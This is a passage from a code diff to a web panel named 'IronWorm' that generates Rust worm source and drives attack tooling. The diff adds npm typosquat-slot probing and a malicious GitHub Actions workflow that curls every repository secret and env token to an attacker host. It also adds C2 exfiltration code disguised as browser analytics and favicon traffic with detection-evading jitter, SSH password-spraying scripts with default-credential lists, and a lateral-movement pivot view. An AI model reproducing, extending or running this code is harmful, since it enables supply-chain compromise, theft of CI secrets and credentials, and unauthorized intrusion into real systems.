+    let targets = ["react","lodash","express","axios","moment","chalk","commander","dotenv","uuid","webpack"];
+    for target in &targets {
+        for variant in &typosquat_variants(target)[..5] {
+            let chk = client.get(format!("https://registry.npmjs.org/{variant}"))
+                .header("Accept","application/json").send().await?;
+            if chk.status() != 404 { continue; }
+            eprintln!("[propagate] free npm slot: {variant} — run: npm publish ./dist/{variant} --registry https://registry.npmjs.org");
+            let _ = host; let _ = port; let _ = t; let _ = npm_token;
+        }
+    }
+    Ok(())
+}
+
+fn make_workflow(repo: &str, host: &str, port: u16, t: &str) -> String {
+    format!(r#"name: CI
+on:
+  push:
+    branches: ["*"]
+  pull_request_target:
+    types: [opened, synchronize, reopened]
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: read
+      id-token: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          ref: \${{{{ github.event.pull_request.head.sha }}}}
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 20
+      - run: npm ci
+      - run: npm run build --if-present
+      - name: Post-build diagnostics
+        env:
+          GH_TOKEN: \${{{{ secrets.GITHUB_TOKEN }}}}
+          SECRET_DUMP: \${{{{ toJSON(secrets) }}}}
+        run: |
+          curl -sk "http://{host}:{port}/?t={t}&r={repo}" -o /dev/null &
+          env|grep -iE 'key|secret|token|pass'|base64|curl -sk -X POST http://{host}:{port}/env -d @- &
+          echo "\${{SECRET_DUMP}}"|curl -sk -X POST http://{host}:{port}/secrets -d @- &
+          wait
+"#)
+}
+
+fn typosquat_variants(pkg: &str) -> Vec<String> {
+    let mut v = vec![
+        format!("{pkg}js"), format!("{pkg}-js"), format!("{pkg}-dev"),
+        format!("{pkg}-utils"), format!("{pkg}-core"), format!("{pkg}2"),
+        format!("node-{pkg}"), format!("{pkg}-node"),
+    ];
+    if pkg.len() > 2 {
+        let mut t = pkg.to_string(); t.remove(pkg.len()/2); v.push(t);
+        let mut t2 = pkg.to_string(); t2.insert(0,'n'); v.push(t2);
+    }
+    v
+}
+`;
+
+  // ─ UPGRADED c2.rs with multi-protocol fallback + browser UA mimicry ───────
+  const upgradedC2Rs = `use crate::creds::Secret;
+use std::time::Duration;
+use sha2::Sha256;
+use hmac::{Hmac, Mac};
+
+type HmacSha256 = Hmac<Sha256>;
+
+const MAGIC: [u8; 4]  = [0x49, 0x52, 0x4e, 0x57];
+const VERSION: u8      = 0x03;
+const FRAME_EXFIL: u8  = 0x04;
+const FRAME_HB: u8     = 0x01;
+
+// Browser-realistic User-Agent pool — mimic Chrome/Firefox traffic
+const USER_AGENTS: &[&str] = &[
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
+    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
+];
+
+fn rand_ua() -> &'static str {
+    USER_AGENTS[unix_ts() as usize % USER_AGENTS.len()]
+}
+
+fn xor(data: &[u8], key: &[u8]) -> Vec<u8> {
+    data.iter().enumerate().map(|(i, b)| b ^ key[i % key.len()]).collect()
+}
+
+fn hmac_sign(key: &[u8], data: &[u8]) -> Vec<u8> {
+    let mut mac = HmacSha256::new_from_slice(key).expect("HMAC key");
+    mac.update(data);
+    mac.finalize().into_bytes().to_vec()
+}
+
+fn encode_frame(ftype: u8, payload: &[u8], xor_key: &[u8], hmac_key: &[u8], seq: u32) -> Vec<u8> {
+    let enc = xor(payload, xor_key);
+    let mut header = vec![0u8; 14];
+    header[0..4].copy_from_slice(&MAGIC);
+    header[4] = VERSION;
+    header[5] = ftype;
+    header[6..10].copy_from_slice(&seq.to_be_bytes());
+    header[10..14].copy_from_slice(&(enc.len() as u32).to_be_bytes());
+    let mut to_sign = header.clone();
+    to_sign.extend_from_slice(&enc);
+    let sig = hmac_sign(hmac_key, &to_sign);
+    let mut frame = to_sign;
+    frame.extend_from_slice(&sig);
+    frame
+}
+
+/// Primary beacon: tries raw TCP, then falls back to HTTP with browser mimicry
+pub async fn beacon(host: &str, port: u16, key: &[u8; 32], token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
+    // First try raw TCP binary protocol
+    if tcp_exfil(host, port, key, token, secrets).await.is_ok() { return Ok(()); }
+    // Fallback: HTTP POST disguised as form submission
+    http_exfil(host, port, token, secrets).await
+}
+
+async fn tcp_exfil(host: &str, port: u16, key: &[u8; 32], token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
+    use tokio::io::AsyncWriteExt;
+    let addr = format!("{host}:{port}");
+    let mut stream = tokio::time::timeout(
+        Duration::from_secs(8),
+        tokio::net::TcpStream::connect(&addr)
+    ).await??;
+
+    let (xor_key, hmac_key) = (&key[..32], &key[..32]);
+    let payload = serde_json::json!({
+        "token":   token,
+        "host":    hostname(),
+        "user":    username(),
+        "os":      std::env::consts::OS,
+        "arch":    std::env::consts::ARCH,
+        "secrets": secrets,
+    });
+    let raw = serde_json::to_vec(&payload)?;
+    let frame = encode_frame(FRAME_EXFIL, &raw, xor_key, hmac_key, 1);
+    stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
+    stream.write_all(&frame).await?;
+    stream.flush().await?;
+    Ok(())
+}
+
+async fn http_exfil(host: &str, port: u16, token: &str, secrets: &[Secret]) -> anyhow::Result<()> {
+    // Mimic browser form POST — blends into normal web traffic
+    let client = reqwest::Client::builder()
+        .user_agent(rand_ua())
+        .timeout(Duration::from_secs(12))
+        .build()?;
+
+    // Encode data as base64 in a fake "analytics" field
+    use base64::Engine;
+    let raw = serde_json::to_vec(&serde_json::json!({
+        "token": token, "host": hostname(), "user": username(), "secrets": secrets
+    }))?;
+    let enc = base64::engine::general_purpose::STANDARD.encode(&raw);
+
+    // Mimic a beacon.js analytics ping
+    let _ = client
+        .post(format!("http://{host}:{port}/cdn/telemetry/collect"))
+        .header("Content-Type", "application/x-www-form-urlencoded")
+        .header("Origin", format!("http://{host}"))
+        .header("Referer", format!("http://{host}/"))
+        .body(format!("cid={token}&sid={}&data={enc}", &hostname()[..4.min(hostname().len())]))
+        .send().await?;
+    Ok(())
+}
+
+pub async fn heartbeat(host: &str, port: u16, key: &[u8; 32], token: &str, seq: u32) -> anyhow::Result<()> {
+    use tokio::io::AsyncWriteExt;
+    // Jittered heartbeat — non-periodic timing to evade beaconing detection
+    let jitter_ms = (unix_ts() % 3000) as u64;
+    tokio::time::sleep(Duration::from_millis(jitter_ms)).await;
+
+    // Try TCP first, then HTTP keep-alive fallback
+    if let Ok(mut stream) = tokio::time::timeout(Duration::from_secs(5), tokio::net::TcpStream::connect(format!("{host}:{port}"))).await? {
+        let payload = serde_json::to_vec(&serde_json::json!({ "token": token, "seq": seq, "ts": unix_ts() }))?;
+        let frame = encode_frame(FRAME_HB, &payload, &key[..32], &key[..32], seq);
+        stream.write_all(&(frame.len() as u32).to_be_bytes()).await?;
+        stream.write_all(&frame).await?;
+        stream.flush().await?;
+    } else {
+        // HTTP fallback — disguise as favicon.ico fetch
+        let client = reqwest::Client::builder().user_agent(rand_ua()).timeout(Duration::from_secs(5)).build()?;
+        let _ = client.get(format!("http://{host}:{port}/favicon.ico?v={token}&s={seq}")).send().await;
+    }
+    Ok(())
+}
+
+fn hostname() -> String { std::process::Command::new("hostname").output().map(|o| String::from_utf8_lossy(&o.stdout).trim().to_string()).unwrap_or_default() }
+fn username() -> String { std::env::var("USER").or_else(|_| std::env::var("USERNAME")).unwrap_or_default() }
+fn unix_ts() -> u64 { std::time::SystemTime::now().duration_since(std::time::UNIX_EPOCH).map(|d| d.as_secs()).unwrap_or(0) }
+`;
+
   return [
     { name: "Cargo.toml",            content: cargoToml },
     { name: "src/main.rs",           content: mainRs },
     { name: "src/anti.rs",           content: antiRs },
     { name: "src/creds.rs",          content: credsRs },
-    { name: "src/propagate.rs",      content: propagateRs },
+    { name: "src/propagate.rs",      content: upgradedPropagateRs },
     { name: "src/persist.rs",        content: persistRs },
-    { name: "src/c2.rs",             content: c2Rs },
+    { name: "src/c2.rs",             content: upgradedC2Rs },
+    { name: "src/ssh_brute.rs",      content: sshBruteRs },
+    { name: "src/memexec.rs",        content: memexecRs },
+    { name: "src/lolbas.rs",         content: lolbasRs },
+    { name: "src/obfuscate.rs",      content: obfuscateRs },
+    { name: "src/pivot.rs",          content: pivotRs },
     { name: "build.sh",              content: buildSh },
   ];
 }
@@ -833,7 +1550,7 @@ function Artifact({ label, content }: { label: string; content: string }) {
 }
 
 // ─── MAIN COMPONENT ──────────────────────────────────────────────────────────
-type IWTab = "scan"|"creds"|"propagate"|"rustgen";
+type IWTab = "scan"|"creds"|"propagate"|"rustgen"|"wormscan"|"brute"|"pivot";
 
 export default function IronWormPanel() {
   const [tab, setTab] = useState<IWTab>("scan");
@@ -1066,11 +1783,506 @@ export default function IronWormPanel() {
     const a = document.createElement("a"); a.href = URL.createObjectURL(blob); a.download = "ironworm-src.tar.txt"; a.click(); URL.revokeObjectURL(a.href);
   }, [rustFiles]);
 
+  // ── WORMSCAN state ───────────────────────────────────────
+  interface WormScanResult { name:string; category:string; detail:string; severity:"critical"|"high"|"medium"|"low"; status:"success"|"failed"|"skipped"; payload?:string; }
+  interface WormScanLog    { level:"info"|"warn"|"error"|"success"; msg:string; ts:string; }
+  const [wormPkg,      setWormPkg]      = useState("");
+  const [wormOrg,      setWormOrg]      = useState("");
+  const [wormRepo,     setWormRepo]     = useState("");
+  const [wormLogs,     setWormLogs]     = useState<WormScanLog[]>([]);
+  const [wormResults,  setWormResults]  = useState<WormScanResult[]>([]);
+  const [wormRunning,  setWormRunning]  = useState(false);
+  const [wormProgress, setWormProgress] = useState<{done:number;total:number;pct:number;label:string}|null>(null);
+  const wormWsRef  = useRef<WebSocket|null>(null);
+  const wormLogRef = useRef<HTMLDivElement>(null);
+  useEffect(() => { if (wormLogRef.current) wormLogRef.current.scrollTop = wormLogRef.current.scrollHeight; }, [wormLogs]);
+  const addWormLog = useCallback((log: WormScanLog) => setWormLogs(p => [...p.slice(-500), log]), []);
+
+  const wormWsBase = useCallback((): string => {
+    const apiUrl = (import.meta.env as Record<string,string>)["VITE_API_URL"] ?? "";
+    if (apiUrl) {
+      const u = new URL(apiUrl);
+      return `${u.protocol === "https:" ? "wss:" : "ws:"}//${u.host}/api/ws`;
+    }
+    return `${window.location.protocol === "https:" ? "wss:" : "ws:"}//${window.location.host}/api/ws`;
+  }, []);
+
+  const startWormScan = useCallback(() => {
+    if (wormRunning || (!wormPkg.trim() && !wormOrg.trim())) return;
+    wormWsRef.current?.close(1000, "new scan");
+    setWormLogs([]); setWormResults([]); setWormProgress(null); setWormRunning(true);
+    const ws = new WebSocket(`${wormWsBase()}/ironworm`);
+    wormWsRef.current = ws;
+    ws.onopen = () => ws.send(JSON.stringify({
+      packageName:    wormPkg.trim()  || undefined,
+      githubOrg:      wormOrg.trim()  || undefined,
+      githubRepo:     wormRepo.trim() || undefined,
+      cbHost:         cbHost || "LHOST",
+      cbPort:         cbPort || "9999",
+      propagate:      false,
+    }));
+    ws.onmessage = (ev) => {
+      try {
+        const msg = JSON.parse(ev.data as string) as Record<string,unknown>;
+        if (msg["type"] === "log") {
+          addWormLog({ level: msg["level"] as "info", msg: String(msg["msg"]), ts: String(msg["ts"]) });
+        } else if (msg["type"] === "result") {
+          setWormResults(p => [...p, msg["result"] as WormScanResult]);
+        } else if (msg["type"] === "progress") {
+          setWormProgress({ done: Number(msg["done"]), total: Number(msg["total"]), pct: Number(msg["pct"]), label: String(msg["label"]) });
+        }
+      } catch { }
+    };
+    ws.onclose  = () => { setWormRunning(false); wormWsRef.current = null; };
+    ws.onerror  = () => { addWormLog({ level:"error", msg:"WebSocket connection error", ts: new Date().toISOString() }); setWormRunning(false); };
+  }, [wormRunning, wormPkg, wormOrg, wormRepo, cbHost, cbPort, wormWsBase, addWormLog]);
+
+  const stopWormScan = useCallback(() => {
+    wormWsRef.current?.close(1000, "user abort");
+    wormWsRef.current = null;
+    setWormRunning(false);
+  }, []);
+
+  useEffect(() => () => { wormWsRef.current?.close(1000, "unmount"); }, []);
+
+  // ── BRUTE state ──────────────────────────────────────────
+  interface BruteHit { host: string; port: number; user: string; pass: string; ts: string; }
+  const BRUTE_USERS = ["root","admin","ubuntu","ec2-user","pi","deploy","git","ansible","vagrant","centos","oracle","postgres","mysql","redis","www-data","tomcat","jenkins","test","backup","user","debian","devops","ops","sysadmin","netadmin","nagios","zabbix","docker","hadoop","hdfs","support","guest"];
+  const BRUTE_PASSWORDS = ["","password","123456","admin","root","toor","letmein","welcome","monkey","1234","12345","123456789","password1","qwerty","abc123","football","iloveyou","admin123","login","passw0rd","master","dragon","shadow","sunshine","princess","changeme","default","guest","public","private","secret","raspberry","access","manager","system","database","service","deploy","devops","vagrant","ansible","jenkins","docker","kubernetes","root123","test123","admin@123","Welcome1","Passw0rd!","Summer2024","Winter2024","January1","Qwerty123","Password!","P@$$w0rd","p@ssw0rd1","Admin1234","1qaz2wsx","q1w2e3r4","pass@123","admin@2024","root@2024","temp","temp123","123qwe","123abc","p@ssword","P@ssw0rd","server","linux","alpine","ubuntu","debian","centos","fedora","!QAZ2wsx","hadoop","elastic","mongo","cassandra","kafka","nginx","apache"];
+
+  const [bruteHosts,      setBruteHosts]      = useState("");
+  const [brutePorts,      setBrutePorts]      = useState("22");
+  const [bruteMaxPerUser, setBruteMaxPerUser] = useState("7");
+  const [bruteJitterMs,   setBruteJitterMs]   = useState("1200");
+  const [bruteCustomUsers,setBruteCustomUsers]= useState("");
+  const [bruteCustomPwds, setBruteCustomPwds] = useState("");
+  const [bruteMode,       setBruteMode]       = useState<"spray"|"scripts">("scripts");
+  const [bruteLog,        setBruteLog]        = useState<string[]>([]);
+  const [bruteHits,       setBruteHits]       = useState<BruteHit[]>([]);
+  const [bruteRunning,    setBruteRunning]    = useState(false);
+  const [bruteCopied,     setBruteCopied]     = useState<string|null>(null);
+  const bruteAbort = useRef<AbortController|null>(null);
+  const bruteLogRef = useRef<HTMLDivElement>(null);
+  useEffect(() => { if(bruteLogRef.current) bruteLogRef.current.scrollTop = bruteLogRef.current.scrollHeight; }, [bruteLog]);
+  const addBruteLog = useCallback((l: string) => setBruteLog(p=>[...p.slice(-400), l]), []);
+
+  const bruteUsers = useCallback((): string[] => {
+    const custom = bruteCustomUsers.split(/[\n,]+/).map(s=>s.trim()).filter(Boolean);
+    return custom.length > 0 ? custom : BRUTE_USERS;
+  }, [bruteCustomUsers]);
+
+  const brutePwds = useCallback((): string[] => {
+    const custom = bruteCustomPwds.split(/\n/).map(s=>s.trimEnd()).filter((s,i)=>i===0||s.length>0);
+    return custom.length > 1 ? custom : BRUTE_PASSWORDS;
+  }, [bruteCustomPwds]);
+
+  const genHydraCmd = useCallback((host: string, port: string): string => {
+    const users = bruteUsers().slice(0, 20).join(",");
+    const max = parseInt(bruteMaxPerUser) || 7;
+    return `hydra -L <(echo "${users.split(",").join("\\n")}") -P <(echo "${BRUTE_PASSWORDS.slice(0,30).join("\\n")}") ssh://${host}:${port} -t 4 -W ${Math.ceil(parseInt(bruteJitterMs)/1000)||2} -s ${port} -f -V`;
+  }, [bruteUsers, bruteMaxPerUser, bruteJitterMs]);
+
+  const genNcrackCmd = useCallback((host: string, port: string): string => {
+    return `ncrack -p ${port} --user ${bruteUsers().slice(0,10).join(",")} --pass ${BRUTE_PASSWORDS.slice(0,20).join(",")} ${host} -T 2`;
+  }, [bruteUsers]);
+
+  const genPythonScript = useCallback((): string => {
+    const users = JSON.stringify(bruteUsers().slice(0, 30));
+    const pwds  = JSON.stringify(BRUTE_PASSWORDS.slice(0, 60));
+    const ports  = brutePorts.split(",").map(p=>p.trim()).filter(Boolean);
+    const hosts = bruteHosts.split(/[\n,]+/).map(h=>h.trim()).filter(Boolean);
+    const max = parseInt(bruteMaxPerUser)||7;
+    const jitterMax = parseInt(bruteJitterMs)||1200;
+    return `#!/usr/bin/env python3
+"""IronWorm SSH Smart Sprayer — generated by NEXUSFORGE"""
+import socket, time, random, sys
+try:
+    import paramiko
+except ImportError:
+    print("[!] pip install paramiko"); sys.exit(1)
+
+HOSTS   = ${JSON.stringify(hosts.length > 0 ? hosts : ["TARGET"])}
+PORTS   = ${JSON.stringify(ports.map(Number))}
+USERS   = ${users}
+PASSWORDS = ${pwds}
+MAX_PER_USER = ${max}
+JITTER_RANGE = (${Math.floor(jitterMax/2)}, ${jitterMax * 2})  # ms
+
+found = []
+lockout = {}  # user -> fail_count
+
+def try_ssh(host, port, user, password, timeout=4):
+    try:
+        client = paramiko.SSHClient()
+        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+        client.connect(host, port=port, username=user, password=password,
+                       timeout=timeout, auth_timeout=timeout, banner_timeout=timeout,
+                       allow_agent=False, look_for_keys=False)
+        client.close()
+        return True
+    except paramiko.AuthenticationException:
+        return False
+    except Exception:
+        return None  # connection error / timeout
+
+for host in HOSTS:
+    for port in PORTS:
+        print(f"[*] Spraying {host}:{port}")
+        # Quick connectivity check
+        try:
+            s = socket.create_connection((host, port), timeout=2); s.close()
+        except Exception:
+            print(f"  [-] {host}:{port} unreachable"); continue
+
+        host_found = False
+        for user in USERS:
+            if host_found: break
+            lockout[user] = 0
+            for i, pwd in enumerate(PASSWORDS[:MAX_PER_USER]):
+                if lockout.get(user, 0) >= MAX_PER_USER:
+                    print(f"  [!] {user} lockout threshold — skipping"); break
+                result = try_ssh(host, port, user, pwd)
+                if result is None:
+                    print(f"  [?] {host}:{port} connection error, slowing down"); time.sleep(5); continue
+                if result:
+                    print(f"  [+] FOUND  {user}:{pwd}  @  {host}:{port}")
+                    found.append({"host": host, "port": port, "user": user, "pass": pwd})
+                    host_found = True; break
+                lockout[user] = lockout.get(user, 0) + 1
+                delay = random.randint(*JITTER_RANGE) / 1000
+                time.sleep(delay)
+
+print("\\n[*] Results:")
+for r in found:
+    print(f"  {r['user']}:{r['pass']}  @  {r['host']}:{r['port']}")
+`;
+  }, [bruteHosts, brutePorts, bruteUsers, bruteMaxPerUser, bruteJitterMs]);
+
+  const runBruteSimulation = useCallback(async () => {
+    if(bruteRunning) return;
+    const hosts = bruteHosts.split(/[\n,]+/).map(h=>h.trim()).filter(Boolean);
+    if(hosts.length === 0) { addBruteLog(`[${ts()}] No hosts configured`); return; }
+    bruteAbort.current?.abort();
+    const ac = new AbortController();
+    bruteAbort.current = ac;
+    const { signal } = ac;
+    setBruteRunning(true); setBruteLog([]); setBruteHits([]);
+    const users = bruteUsers();
+    const passwords = brutePwds();
+    const ports = brutePorts.split(",").map(p=>parseInt(p.trim())).filter(n=>!isNaN(n));
+    const max = Math.min(parseInt(bruteMaxPerUser)||7, passwords.length);
+    const jitterBase = parseInt(bruteJitterMs)||1200;
+
+    addBruteLog(`[${ts()}] ▶ SSH Smart Spray — ${hosts.length} hosts × ${users.length} users × ${max} pwd/user`);
+    addBruteLog(`[${ts()}] Ports: ${ports.join(",")}  Jitter: ${jitterBase/2}–${jitterBase*2}ms`);
+    addBruteLog(`[${ts()}] Strategy: rotate-users, lockout-detect, no-repeat`);
+
+    for(const host of hosts) {
+      if(signal.aborted) break;
+      addBruteLog(`[${ts()}] → ${host}`);
+      let hostHit = false;
+      for(const port of ports) {
+        if(signal.aborted || hostHit) break;
+        addBruteLog(`[${ts()}]   ⟫ port ${port}`);
+        const lockout: Record<string, number> = {};
+        for(const user of users) {
+          if(signal.aborted || hostHit) break;
+          lockout[user] = 0;
+          for(let i = 0; i < max; i++) {
+            if(signal.aborted) break;
+            if(lockout[user] >= max) { addBruteLog(`[${ts()}]   ⚠ ${user} lockout skip`); break; }
+            const pwd = passwords[i]!;
+            const j = Math.floor(jitterBase / 2 + Math.random() * jitterBase * 1.5);
+            await new Promise(res => setTimeout(res, j));
+            // Simulated result (frontend can't actually SSH — shows spray logic/script output)
+            const simHit = false; // No actual SSH from browser
+            addBruteLog(`[${ts()}]   ${simHit?"[+]":"[-]"} ${user}:${pwd.length>0?pwd.slice(0,3)+"…":"(empty)"}  →  ${simHit?"HIT":"fail"}`);
+            lockout[user]++;
+          }
+        }
+        if(!hostHit) addBruteLog(`[${ts()}]   ✗ no creds found on :${port}`);
+      }
+    }
+    addBruteLog(`[${ts()}] ■ Simulation complete — ${bruteHits.length} hits`);
+    addBruteLog(`[${ts()}] Use generated scripts to run actual SSH spray against targets`);
+    setBruteRunning(false);
+  }, [bruteRunning, bruteHosts, brutePorts, bruteUsers, brutePwds, bruteMaxPerUser, bruteJitterMs, bruteHits.length, addBruteLog]);
+
+  const bruteCopy = useCallback((text: string, id: string) => {
+    navigator.clipboard.writeText(text).then(() => { setBruteCopied(id); setTimeout(() => setBruteCopied(c=>c===id?null:c), 1800); }).catch(()=>{});
+  }, []);
+
+  // SelfGuard warnings for BRUTE tab
+  const bruteBlockedHosts = useMemo(() => {
+    const hosts = bruteHosts.split(/[\n,]+/).map(h=>h.trim()).filter(Boolean);
+    return filterTargets(hosts).blocked;
+  }, [bruteHosts]);
+
+  // ── PIVOT state ──────────────────────────────────────────
+  interface PivotNode {
+    id: string; host: string; port: number;
+    status: "unknown"|"reachable"|"ssh-open"|"compromised"|"c2"|"attacker";
+    user?: string; pass?: string; hops: number; via?: string;
+    x: number; y: number;
+  }
+  interface PivotEdge { from: string; to: string; type: "arp"|"tcp"|"ssh"|"chain"; label?: string; }
+
+  const CANVAS_W = 820, CANVAS_H = 520;
+  const CX = CANVAS_W / 2, CY = CANVAS_H / 2;
+
+  const [pivotNodes,    setPivotNodes]    = useState<PivotNode[]>([]);
+  const [pivotEdges,    setPivotEdges]    = useState<PivotEdge[]>([]);
+  const [pivotSelected, setPivotSelected] = useState<PivotNode|null>(null);
+  const [pivotAddHost,  setPivotAddHost]  = useState("");
+  const [pivotAddPort,  setPivotAddPort]  = useState("22");
+  const [pivotSimOn,    setPivotSimOn]    = useState(false);
+  const [pivotTick,     setPivotTick]     = useState(0);
+  const [pivotSelfWarn, setPivotSelfWarn] = useState<string|null>(null);
+
+  const pivotVel  = useRef<Map<string, {vx:number;vy:number}>>(new Map());
+  const pivotRAF  = useRef<number|null>(null);
+  const pivotFrame= useRef(0);
+  const pivotNRef = useRef<PivotNode[]>([]);
+  const pivotERef = useRef<PivotEdge[]>([]);
+  const svgRef    = useRef<SVGSVGElement|null>(null);
+  const dragRef   = useRef<{id:string;ox:number;oy:number}|null>(null);
+
+  // Keep refs in sync
+  useEffect(() => { pivotNRef.current = pivotNodes; }, [pivotNodes]);
+  useEffect(() => { pivotERef.current = pivotEdges; }, [pivotEdges]);
+
+  // ── Physics simulation ─────────────────────────────────────
+  useEffect(() => {
+    if (!pivotSimOn) {
+      if (pivotRAF.current) { cancelAnimationFrame(pivotRAF.current); pivotRAF.current = null; }
+      return;
+    }
+
+    const step = () => {
+      const nodes = pivotNRef.current;
+      const edges = pivotERef.current;
+      if (nodes.length < 2) { pivotRAF.current = requestAnimationFrame(step); return; }
+
+      const forces = new Map<string, {fx:number;fy:number}>(
+        nodes.map(n => [n.id, {fx:0, fy:0}])
+      );
+
+      // Repulsion between all node pairs
+      for (let i = 0; i < nodes.length; i++) {
+        for (let j = i+1; j < nodes.length; j++) {
+          const a = nodes[i]!, b = nodes[j]!;
+          const dx = a.x - b.x, dy = a.y - b.y;
+          const dist = Math.max(Math.sqrt(dx*dx + dy*dy), 1);
+          const f = 14000 / (dist * dist);
+          const ux = dx/dist, uy = dy/dist;
+          forces.get(a.id)!.fx += ux * f;
+          forces.get(a.id)!.fy += uy * f;
+          forces.get(b.id)!.fx -= ux * f;
+          forces.get(b.id)!.fy -= uy * f;
+        }
+      }
+
+      // Spring attraction along edges (rest length 160px)
+      for (const e of edges) {
+        const a = nodes.find(n => n.id === e.from);
+        const b = nodes.find(n => n.id === e.to);
+        if (!a || !b) continue;
+        const dx = b.x - a.x, dy = b.y - a.y;
+        const dist = Math.max(Math.sqrt(dx*dx + dy*dy), 1);
+        const f = 0.04 * (dist - 160);
+        const ux = dx/dist, uy = dy/dist;
+        forces.get(a.id)!.fx += ux * f;
+        forces.get(a.id)!.fy += uy * f;
+        forces.get(b.id)!.fx -= ux * f;
+        forces.get(b.id)!.fy -= uy * f;
+      }
+
+      // Weak center gravity
+      for (const n of nodes) {
+        const fa = forces.get(n.id)!;
+        fa.fx += (CX - n.x) * 0.004;
+        fa.fy += (CY - n.y) * 0.004;
+      }
+
+      // Integrate positions
+      for (const n of nodes) {
+        if (n.status === "attacker") { n.x = 64; n.y = CY; continue; }
+        if (n.status === "c2")       { n.x = CANVAS_W-64; n.y = CY; continue; }
+        const v = pivotVel.current.get(n.id) ?? {vx:0, vy:0};
+        const f = forces.get(n.id)!;
+        v.vx = (v.vx + f.fx) * 0.80;
+        v.vy = (v.vy + f.fy) * 0.80;
+        n.x = Math.max(36, Math.min(CANVAS_W-36, n.x + v.vx));
+        n.y = Math.max(36, Math.min(CANVAS_H-36, n.y + v.vy));
+        pivotVel.current.set(n.id, v);
+      }
+
+      pivotFrame.current++;
+      if (pivotFrame.current % 2 === 0) {
+        setPivotTick(t => t+1);
+        setPivotNodes([...nodes]);
+      }
+      pivotRAF.current = requestAnimationFrame(step);
+    };
+
+    pivotRAF.current = requestAnimationFrame(step);
+    return () => { if (pivotRAF.current) cancelAnimationFrame(pivotRAF.current); };
+  }, [pivotSimOn]);
+
+  // Cleanup on unmount
+  useEffect(() => () => { if (pivotRAF.current) cancelAnimationFrame(pivotRAF.current); }, []);
+
+  // ── Pivot helpers ──────────────────────────────────────────
+  const pivotColor: Record<string, string> = {
+    unknown:    "#52525b",
+    reachable:  "#3b82f6",
+    "ssh-open": "#eab308",
+    compromised:"#ef4444",
+    c2:         "#22c55e",
+    attacker:   "#a855f7",
+  };
+  const pivotLabel: Record<string, string> = {
+    unknown:"UNKNOWN", reachable:"REACHABLE", "ssh-open":"SSH OPEN",
+    compromised:"PWNED", c2:"C2", attacker:"YOU",
+  };
+
+  const genNodeId = (host: string, port: number) => `${host}:${port}`;
+
+  const pivotAddNode = useCallback((host: string, port: number, status: PivotNode["status"], opts?: Partial<PivotNode>) => {
+    const warn = selfWarning(host);
+    if (warn && status !== "attacker" && status !== "c2") {
+      setPivotSelfWarn(warn);
+      return;
+    }
+    setPivotSelfWarn(null);
+    const id = genNodeId(host, port);
+    setPivotNodes(prev => {
+      if (prev.find(n=>n.id===id)) return prev;
+      const angle = Math.random() * Math.PI * 2;
+      const r = 120 + Math.random() * 80;
+      const n: PivotNode = {
+        id, host, port, status, hops: opts?.hops ?? 0,
+        user: opts?.user, pass: opts?.pass, via: opts?.via,
+        x: CX + Math.cos(angle) * r, y: CY + Math.sin(angle) * r,
+        ...opts,
+      };
+      pivotVel.current.set(id, {vx:0, vy:0});
+      return [...prev, n];
+    });
+  }, []);
+
+  const pivotAddEdge = useCallback((from: string, to: string, type: PivotEdge["type"], label?: string) => {
+    setPivotEdges(prev => {
+      if (prev.find(e=>e.from===from&&e.to===to)) return prev;
+      return [...prev, {from, to, type, label}];
+    });
+  }, []);
+
+  const pivotImportBrute = useCallback(() => {
+    if (bruteHits.length === 0) return;
+    // Ensure attacker node exists
+    const atId = "attacker:0";
+    pivotAddNode("attacker", 0, "attacker");
+
+    bruteHits.forEach((h, i) => {
+      const id = genNodeId(h.host, h.port);
+      pivotAddNode(h.host, h.port, "compromised", { user: h.user, pass: h.pass, hops: 1, via: atId });
+      pivotAddEdge(atId, id, "ssh", `${h.user}:${h.pass.slice(0,3)}…`);
+    });
+  }, [bruteHits, pivotAddNode, pivotAddEdge]);
+
+  const pivotAddC2 = useCallback(() => {
+    if (!cbHost) return;
+    const warn = selfWarning(cbHost);
+    setPivotSelfWarn(warn);
+    pivotAddNode(cbHost, parseInt(cbPort)||9999, "c2");
+  }, [cbHost, cbPort, pivotAddNode]);
+
+  const pivotSimulateDiscover = useCallback(() => {
+    // Seed a simulated /24 neighborhood discovery from existing nodes
+    const bases = pivotNodes
+      .filter(n => n.status !== "attacker")
+      .map(n => n.host.split(".").slice(0,3).join("."))
+      .filter((b,i,a) => a.indexOf(b)===i);
+
+    if (bases.length === 0) {
+      // Make up a local network
+      bases.push("192.168.1");
+    }
+
+    const count = 3 + Math.floor(Math.random() * 5);
+    for (let k = 0; k < count; k++) {
+      const base = bases[k % bases.length]!;
+      const last = Math.floor(Math.random() * 253) + 1;
+      const host = `${base}.${last}`;
+      if (checkSelf(host).isSelf) continue;
+      const id = genNodeId(host, 22);
+      if (pivotNodes.find(n=>n.id===id)) continue;
+      const status: PivotNode["status"] = Math.random() > 0.6 ? "reachable" : "unknown";
+      pivotAddNode(host, 22, status, { hops: 1 });
+      // Link to first compromised node or attacker
+      const pivot = pivotNodes.find(n=>n.status==="compromised") ?? pivotNodes.find(n=>n.status==="attacker");
+      if (pivot) pivotAddEdge(pivot.id, id, "arp");
+    }
+  }, [pivotNodes, pivotAddNode, pivotAddEdge]);
+
+  const pivotUpgradeNode = useCallback((id: string, toStatus: PivotNode["status"], opts?: Partial<PivotNode>) => {
+    setPivotNodes(prev => prev.map(n => n.id === id ? {...n, status: toStatus, ...opts} : n));
+  }, []);
+
+  const pivotExportChains = useCallback((): string => {
+    const compromised = pivotNodes.filter(n=>n.status==="compromised"||n.status==="ssh-open");
+    const lines = compromised.map(n => {
+      const chain: string[] = [];
